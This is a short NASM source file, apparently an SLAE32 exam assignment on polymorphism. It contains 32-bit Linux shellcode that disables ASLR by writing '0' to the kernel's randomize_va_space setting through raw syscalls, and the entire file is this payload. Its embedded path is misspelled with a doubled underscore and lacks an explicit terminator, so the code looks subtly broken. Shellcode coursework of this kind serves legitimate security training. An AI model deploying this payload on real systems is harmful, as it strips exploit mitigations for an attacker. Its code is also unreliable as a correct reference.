; disable_aslr_polymorphic.nasm - 71 bytes
; Author: Jack McBride (PA-6483)
; Website:  https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
;
; Assignment 6: Polymorphism

global _start

section .text

_start:
	jmp _aslr	
	
_main:
	xor eax, eax
	pop ebx
	mov cx,0x2bc 
	mov al,0x8 
	int 0x80 
	mov ebx,eax 
	push byte 0x30
	mov ecx,esp 
	inc edx 
	mov al,0x4 
	int 0x80 
	mov al,0x6 
	int 0x80 
	inc eax 
	int 0x80

_aslr:
	call _main
	db '/proc/sys/kernel/randomize_va__space'
